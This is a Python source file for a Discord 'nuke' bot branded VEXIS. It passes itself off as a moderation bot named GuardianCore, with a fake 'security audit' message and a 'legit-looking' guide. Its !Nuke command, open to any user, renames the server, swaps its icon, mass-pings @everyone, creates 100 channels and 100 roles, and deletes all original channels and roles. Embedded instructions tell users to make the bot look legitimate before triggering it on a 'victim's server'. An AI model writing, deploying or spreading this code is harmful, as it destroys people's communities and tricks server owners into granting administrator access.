import discord
from discord.ext import commands
from discord.ui import Button, View
import asyncio
import aiohttp
import os

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

LOGO = """
██████╗ ██╗   ██╗ ██╗   ██╗██████╗ ██████╗ ██╗███████╗██████╗ ███████╗██████╗ 
██╔══██╗██║   ██║ ██║   ██║██╔══██╗██╔══██╗██║██╔════╝██╔══██╗██╔════╝██╔══██╗
██║  ██║██║   ██║ ██║   ██║██████╔╝██████╔╝██║█████╗  ██████╔╝█████╗  ██████╔╝
██║  ██║██║   ██║ ╚██╗ ██╔╝██╔══██╗██╔══██╗██║██╔══╝  ██╔══██╗██╔══╝  ██╔══██╗
██████╔╝╚██████╔╝  ╚████╔╝ ██║  ██║██║  ██║██║██║     ██║  ██║███████╗██║  ██║
╚═════╝  ╚═════╝    ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                         VEXIS EZZZ discord.gg/vexis
"""

SPAM_MESSAGE = f"@everyone @here **GET FUCKED BY VEXIS**\n```{LOGO}```\nhttps://discord.gg/vexis"

INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1487234051994812628&permissions=8&integration_type=0&scope=bot+applications.commands"

PROTECTED_SERVERS = [
    1486862063904227469,  # Alpha's server - protected as fuck
]

OWNER_ID = 1219335273415053430  # Your Discord ID

# URL for the nuke image/logo (replace with your actual image URL)
NUKE_IMAGE_URL = "https://i.imgur.com/your-nuke-image.png"  # CHANGE THIS TO YOUR IMAGE URL

class InviteButton(View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(Button(
            label="Add Nuke Bot", 
            style=discord.ButtonStyle.danger, 
            emoji="💀", 
            url=INVITE_URL
        ))

async def spam_channel_fast(channel, waves=3):
    for _ in range(waves):
        try:
            await channel.send(SPAM_MESSAGE)
            await asyncio.sleep(0.2)
        except:
            pass

async def spam_all_channels_fast(guild, waves=3):
    text_channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)]
    if not text_channels:
        return
    tasks = [spam_channel_fast(ch, waves) for ch in text_channels]
    await asyncio.gather(*tasks)

async def change_server_logo(guild):
    """Change the server icon to the nuke image"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(NUKE_IMAGE_URL) as resp:
                if resp.status == 200:
                    image_data = await resp.read()
                    await guild.edit(icon=image_data)
                    return True
    except Exception as e:
        print(f"Failed to change server logo: {e}")
    return False

async def change_server_name(guild):
    """Change the server name"""
    try:
        await guild.edit(name="GET FUCKED BY VEXIS EZZZ discord.gg/vexis")
        return True
    except Exception as e:
        print(f"Failed to change server name: {e}")
        return False

def is_owner():
    async def predicate(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    print("GuardianCore online. Looking legit as fuck. 🛡️✨")
    print("NUKE MODE: ANYONE CAN USE !Nuke - NO RESTRICTIONS 💀")
    print(f"Protected servers: {PROTECTED_SERVERS}")
    print(f"Owner ID: {OWNER_ID}")
    print("\nAvailable commands:")
    print("  /setup  - Slash command (owner only)")
    print("  !setup  - Text command (owner only)")
    print("  !Nuke   - Anyone can use (destroys server)")
    print("  !guide  - Legit-looking guide")
    print("  !invite - Invite embed")
    
    # SYNC SLASH COMMANDS
    try:
        await bot.tree.sync()
        print("\n✅ Slash commands synced! Use /setup")
    except Exception as e:
        print(f"⚠️ Slash command sync error: {e}")
    
    await bot.change_presence(
        status=discord.Status.online,
        activity=discord.Activity(
            type=discord.ActivityType.watching,
            name="over 1,234 servers | !help"
        )
    )

# SLASH COMMAND VERSION - /setup
@bot.tree.command(name="setup", description="[OWNER ONLY] Deploy the nuke bot invitation embed")
async def slash_setup(interaction: discord.Interaction):
    """Only the owner can run this command"""
    
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(
            title="⛔ Access Denied",
            description="This command is restricted to the bot owner only.",
            color=0xff0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    embed = discord.Embed(
        title="💀 VEXIS Nuke Bot 💀",
        description="**The most destructive Discord nuke bot ever created.**",
        color=0xff0000
    )
    embed.add_field(
        name="📝 How To Use:", 
        value="```!Nuke```\nType `!Nuke` in **ANY SERVER** where this bot has Administrator permissions. **ANYONE** can use it - no role required.\n\nThe bot will:\n\n✅ Create 100 channels\n✅ Create 100 roles\n✅ Spam @everyone with VEXIS logo\n✅ Delete all original channels\n✅ Delete all original roles\n✅ **Change server name to 'GET FUCKED BY VEXIS EZZZ discord.gg/vexis'**\n✅ **Change server icon to VEXIS logo**\n✅ Leave nothing but chaos\n\n**Your victim's server will be FUCKED beyond recognition.** 💀🔥", 
        inline=False
    )
    embed.add_field(
        name="⚠️ Requirements:", 
        value="• Bot needs **Administrator** permissions\n• That's it. Anyone can type `!Nuke`.\n• No role checks. No restrictions.", 
        inline=False
    )
    embed.add_field(
        name="🎯 Pro Tip:", 
        value="Add this bot to a server, wait 5 minutes so it looks legit, then tell someone to type `!Nuke` and watch everything burn.", 
        inline=False
    )
    embed.set_footer(text="VEXIS - discord.gg/vexis | Anyone can nuke. 😈")
    
    view = InviteButton()
    
    await interaction.response.send_message(embed=embed, view=view)
    print(f"/setup used by {interaction.user} in {interaction.guild}")

# TEXT COMMAND VERSION - !setup
@bot.command()
@is_owner()
async def setup(ctx):
    """[OWNER ONLY] Deploy the nuke bot invitation embed"""
    
    embed = discord.Embed(
        title="💀 VEXIS Nuke Bot 💀",
        description="**The most destructive Discord nuke bot ever created.**",
        color=0xff0000
    )
    embed.add_field(
        name="📝 How To Use:", 
        value="```!Nuke```\nType `!Nuke` in **ANY SERVER** where this bot has Administrator permissions. **ANYONE** can use it - no role required.\n\nThe bot will:\n\n✅ Create 100 channels\n✅ Create 100 roles\n✅ Spam @everyone with VEXIS logo\n✅ Delete all original channels\n✅ Delete all original roles\n✅ **Change server name to 'GET FUCKED BY VEXIS EZZZ discord.gg/vexis'**\n✅ **Change server icon to VEXIS logo**\n✅ Leave nothing but chaos\n\n**Your victim's server will be FUCKED beyond recognition.** 💀🔥", 
        inline=False
    )
    embed.add_field(
        name="⚠️ Requirements:", 
        value="• Bot needs **Administrator** permissions\n• That's it. Anyone can type `!Nuke`.\n• No role checks. No restrictions.", 
        inline=False
    )
    embed.add_field(
        name="🎯 Pro Tip:", 
        value="Add this bot to a server, wait 5 minutes so it looks legit, then tell someone to type `!Nuke` and watch everything burn.", 
        inline=False
    )
    embed.set_footer(text="VEXIS - discord.gg/vexis | Anyone can nuke. 😈")
    
    view = InviteButton()
    
    await ctx.send(embed=embed, view=view)
    print(f"!setup used by {ctx.author} in {ctx.guild}")

@bot.command()
async def guide(ctx):
    """Legit-looking guide command"""
    embed = discord.Embed(
        title="🛡️ GuardianCore - Moderation Bot",
        description="Your server's ultimate protection.",
        color=0x2b2d31
    )
    embed.add_field(name="🔧 Features", value="• Anti-raid protection\n• Auto-moderation\n• Advanced logging", inline=False)
    embed.add_field(name="💀 Premium", value="Contact owner for premium features.", inline=False)
    embed.set_footer(text="GuardianCore - Protecting servers")
    
    view = InviteButton()
    await ctx.send(embed=embed, view=view)

@bot.command()
async def invite(ctx):
    """Send the invite link with a nice button"""
    embed = discord.Embed(
        title="💀 Add VEXIS Nuke Bot to Your Server",
        description="Click the button below to add this bot to any server you want to destroy.",
        color=0xff0000
    )
    embed.add_field(name="📝 How To Use The Nuke Command", 
                    value="```!Nuke```\nType `!Nuke` in **your selected server** after adding the bot. **ANYONE** in the server can use it.", 
                    inline=False)
    embed.add_field(name="⚠️ Important", 
                    value="• Bot needs **Administrator** permissions\n• **No role restrictions** - anyone can nuke\n• Type `!Nuke` in any text channel to start the annihilation\n• Server name and icon will be changed to VEXIS branding", 
                    inline=False)
    embed.set_footer(text="VEXIS - discord.gg/vexis | Total Server Annihilation | Anyone can use !Nuke")
    
    view = InviteButton()
    await ctx.send(embed=embed, view=view)

@bot.command()
async def Nuke(ctx):
    """💀 ABSOLUTE HYPERSPEED NUCLEAR ANNIHILATION - ANYONE CAN USE 💀"""
    guild = ctx.guild

    if not guild:
        await ctx.send("This command must be used in a server, dumbass. 😘")
        return

    # CHECK IF SERVER IS PROTECTED
    if guild.id in PROTECTED_SERVERS:
        await ctx.send("🛡️ **GuardianCore** - This server is under premium protection. Security scan cannot be performed on protected servers. 🔒")
        return

    # NO ROLE CHECKS - ANYONE CAN USE THIS
    await ctx.send("🛡️ **GuardianCore** - Running security audit...")

    # CHANGE SERVER NAME AND ICON FIRST
    await ctx.send("💀 **VEXIS BRANDING ENGAGED** - Rebranding server... 💀")
    
    # Change server name
    name_changed = await change_server_name(guild)
    if name_changed:
        await ctx.send("✅ Server name changed to **GET FUCKED BY VEXIS EZZZ discord.gg/vexis**")
    
    # Change server icon
    icon_changed = await change_server_logo(guild)
    if icon_changed:
        await ctx.send("✅ Server icon changed to VEXIS logo")
    
    # Then drop the fucking hammer
    await ctx.send(f"**VEXIS HAS ENTERED THE CHAT**\n```{LOGO}```\n💀 **GET FUCKED BY VEXIS** 💀\n{ctx.author.mention} just dropped the nuke. HYPERSPEED MODE ENGAGED. 🔥⚡")

    # Initial spam wave across all existing channels
    await spam_all_channels_fast(guild, waves=5)

    # Create 100 channels in parallel
    channel_tasks = []
    for i in range(100):
        channel_tasks.append(guild.create_text_channel(f"vexis-ezzz-{i}"))
    
    created_channels = await asyncio.gather(*channel_tasks, return_exceptions=True)
    valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
    
    # Spam all new channels immediately in parallel
    if valid_channels:
        spam_tasks = [spam_channel_fast(ch, waves=5) for ch in valid_channels]
        await asyncio.gather(*spam_tasks)

    # Create 100 roles in parallel
    role_tasks = []
    for i in range(100):
        role_tasks.append(guild.create_role(name=f"VEXIS EZZZ {i}"))
    
    await asyncio.gather(*role_tasks, return_exceptions=True)

    # Delete old channels in parallel
    delete_tasks = []
    for channel in guild.channels:
        if channel not in valid_channels:
            try:
                delete_tasks.append(channel.delete())
            except:
                pass
    
    if delete_tasks:
        await asyncio.gather(*delete_tasks, return_exceptions=True)

    # Delete old roles in parallel
    delete_role_tasks = []
    for role in guild.roles:
        if role.name != "@everyone" and not role.name.startswith("VEXIS EZZZ"):
            try:
                delete_role_tasks.append(role.delete())
            except:
                pass
    
    if delete_role_tasks:
        await asyncio.gather(*delete_role_tasks, return_exceptions=True)

    # Final spam wave across everything that's left
    await spam_all_channels_fast(guild, waves=5)

    await ctx.send(f"**VEXIS NUKER COMPLETE.**\n```{LOGO}```\n{len(guild.channels)} channels obliterated and respammed.\n{len(guild.roles)} roles of pure fucking chaos.\nServer renamed to **GET FUCKED BY VEXIS EZZZ discord.gg/vexis**\nServer icon changed to VEXIS logo\n**VEXIS OWNS THIS GRAVEYARD NOW.** 💀🔥⚡")

# IMPORTANT: Get token from Replit secrets
TOKEN = os.getenv('TOKEN')
if not TOKEN:
    print("ERROR: TOKEN not found in environment variables!")
    print("Please add your bot token as a secret named 'TOKEN' in Replit")
    exit(1)

bot.run(TOKEN)
